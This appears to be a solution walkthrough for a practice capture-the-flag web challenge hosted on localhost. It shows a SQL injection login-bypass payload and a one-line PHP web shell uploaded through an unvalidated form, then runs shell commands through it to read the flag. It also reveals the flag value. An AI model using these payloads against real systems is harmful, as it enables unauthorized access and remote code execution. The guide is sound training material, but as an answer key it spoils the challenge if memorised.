# Solution Guide: SecureCorp CTF

**WARNING: SPOILERS AHEAD. DO NOT READ UNLESS YOU ARE STUCK OR VERIFYING THE SETUP.**

## Step 1: Enumeration
- Navigate to the website. You see Home, About, and Contact pages.
- The `index.php` is a login page.
- Trying generic credentials (admin/admin) fails.

## Step 2: SQL Injection (Authentication Bypass)
- The login form is vulnerable to SQL Injection.
- **Goal:** Log in without a password.
- **Vector:** The query is likely `SELECT * FROM users WHERE username = '$username' AND password = '$password'`.
- **Exploit:**
  - Username: `admin' -- -`
    - (The `'` closes the username string. The `-- -` comments out the rest of the query, ignoring the password check).
  - Password: (anything)
- **Result:** You are logged in as "admin" and redirected to `dashboard.php`.

## Step 3: Enumeration (Internal)
- Inside the dashboard, explore the tabs.
- "Documents" has fake downloads.
- "My Profile" allows you to upload a "Profile Photo".
- Below the upload form, there is a list of "Uploaded Files". This is crucial—it tells you where your files end up.

## Step 4: Unrestricted File Upload (RCE)
- The server does not validate the file type or extension.
- **Goal:** Upload a web shell to execute commands on the server.
- **Action:**
  1. Create a file named `shell.php`.
  2. Add the following code:
     ```php
     <?php system($_GET['cmd']); ?>
     ```
  3. Upload this file via the "Update Profile Photo" form.
  4. The site says "File 'shell.php' uploaded successfully!".
  5. Locate the file in the "Uploaded Files" list or navigate to `uploads/shell.php`.

## Step 5: Capture the Flag
- Now you have Remote Code Execution (RCE).
- Click the link to your uploaded file, or go to `http://localhost/uploads/shell.php`.
- Adding the `?cmd=` parameter allows you to run Linux commands.
- **Find the flag:**
  - `http://localhost/uploads/shell.php?cmd=ls /` -> Shows `flag.txt` in the root.
  - `http://localhost/uploads/shell.php?cmd=cat /flag.txt`
- **Flag Value:** `CTF{Unr3strict3d_Upl0ad5_L3ad_T0_RCE_M4st3r}`
